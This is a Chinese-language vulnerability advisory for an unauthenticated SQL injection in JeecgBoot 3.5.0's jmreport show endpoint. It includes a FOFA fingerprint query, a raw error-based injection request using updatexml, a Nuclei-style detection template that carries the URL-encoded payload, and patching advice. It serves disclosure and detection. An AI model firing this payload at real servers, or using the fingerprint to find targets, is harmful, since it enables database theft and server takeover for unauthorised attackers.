# JeecgBoot3.5.0版show接口SQL存在注入漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | JeecgBoot3.5.0版show接口SQL存在注入漏洞 |
| 漏洞类型 | SQL注入 |
| 组件 | JeecgBoot |
| 影响版本 | JeecgBoot 3.5.0 |
| 严重程度 | 高危 |

## 漏洞概述

JeecgBoot3.5.0版show接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 测绘语法

详见 `../../vulns/fofa-cache.md`

``` body="jeecg-boot" ```

## 漏洞复现

### POC

```
GET /jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params={"id":"1'and(updatexml(0x3a,concat(1,(database())),1))='"}
```

#

 检测脚本

```yaml
﻿id: jeecgboot-sql-injection-show

info:
  name: JeecgBoot 3.5.0 show 接口 SQL注入
  author: vulns-reproduce
  severity: high
  description: JeecgBoot 3.5.0 版本 show 接口存在 SQL 注入漏洞，未经身份验证的远程攻击者可利用获取数据库信息
  reference:
    - https://blog.wuyaoxuexi.cn
  tags: jeecgboot,sql-injection,cnvd

requests:
  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params=%7b%22%69%64%22%3a%22%31%27%61%6e%64%28%75%70%64%61%74%65%78%6d%6c%28%30%78%33%61%2c%63%6f%6e%63%61%74%28%31%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%2c%31%29%29%3d%27%22%7d"
    matchers:
      - type: word
        words:
          - "SQLException"
          - "sql"
          - "com.mysql"
        part: body
        case-insensitive: true

  - method: GET
    path:
      - "{{BaseURL}}/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params=%7b%22%69%64%22%3a%22%31%27%61%6e%64%28%75%70%64%61%74%65%78%6d%6c%28%30%78%33%61%2c%63%6f%6e%63%61%74%28%31%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%2c%31%29%29%3d%27%22%7d"
    matchers:
      - type: word
        words:
          - "SQLException"
          - "sql"
          - "com.mysql"
        part: body
        case-insensitive: true
        negative: true


```


## 漏洞修复

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限